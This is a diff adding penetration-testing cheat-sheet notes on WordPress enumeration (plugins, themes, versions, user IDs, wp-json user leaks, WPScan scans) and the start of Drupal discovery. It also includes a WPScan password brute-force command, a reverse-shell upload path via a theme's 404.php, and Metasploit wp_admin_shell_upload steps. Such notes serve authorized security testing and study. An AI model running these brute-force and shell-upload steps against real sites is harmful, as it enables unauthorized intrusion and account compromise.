@@ -2594,3 +2594,83 @@ Inside the source code of the page (example from https://wordpress.org/support/a
 
 Grep
 curl https://victim.com/ | grep 'content="WordPress'
+
+Meta name
+![alt text](image.png)
+
+CSS link files
+![alt text](image-1.png)
+
+Get Plugins
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+
+Get Themes
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+
+Extract versions in general
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
+
+Active enumeration
+
+Plugins and Themes
+
+You probably won't be able to find all the Plugins and Themes passible. In order to discover all of them, you will need to actively Brute Force a list of Plugins and Themes (hopefully for us there are automated tools that contains this lists).
+
+Users
+ID Brute
+
+You get valid users from a WordPress site by Brute Forcing users IDs:
+curl -s -I -X GET http://blog.example.com/?author=1
+
+If the responses are 200 or 30X, that means that the id is valid. If the the response is 400, then the id is invalid.
+wp-json
+You can also try to get information about the users by querying:
+curl http://blog.example.com/wp-json/wp/v2/users
+
+Only information about the users that has this feature enable will be provided.
+Also note that /wp-json/wp/v2/pages could leak IP addresses.
+Login username enumeration
+When login in /wp-login.php the message is different is the indicated username exists or not.
+WPScan
+
+wpscan -h #List WPscan Parameters
+wpscan --update #Update WPscan
+
+#Enumerate WordPress using WPscan
+
+
+wpscan --url "http://<TARGET_IP>" -e t #All Themes Installed
+
+wpscan --url "http://<TARGET_IP>" -e vt #Vulnerable Themes Installed
+
+wpscan --url "http://<TARGET_IP>"  -e p #All Plugins Installed
+
+wpscan --url "http://<TARGET_IP>"  -e vp #Vulnerable Themes Installed
+
+wpscan --url "http://<TARGET_IP>"  -e u #WordPress Users
+
+wpscan --url "http://<TARGET_IP>"  --passwords path-to-wordlist #Brute Force WordPress Passwords
+
+#Upload Reverse Shell to WordPress
+http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php
+
+#Upload using Metasploit
+msf > use exploit/unix/webapp/wp_admin_shell_upload
+msf exploit(wp_admin_shell_upload) > set USERNAME admin
+msf exploit(wp_admin_shell_upload) > set PASSWORD admin
+msf exploit(wp_admin_shell_upload) > set targeturi /wordpress
+msf exploit(wp_admin_shell_upload) > exploit
+
+
+Drupal
+Discovery
+Check meta
+curl https://www.drupal.org/ | grep 'content="Drupal'
+Node: Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form /node/<nodeid>.
+curl drupal-site.com/node/1
+Enumeration
+Drupal supports three types of users by default:
+
+Administrator: This user has complete control over the Drupal website.
+Authenticated User: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
+Anonymous: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.
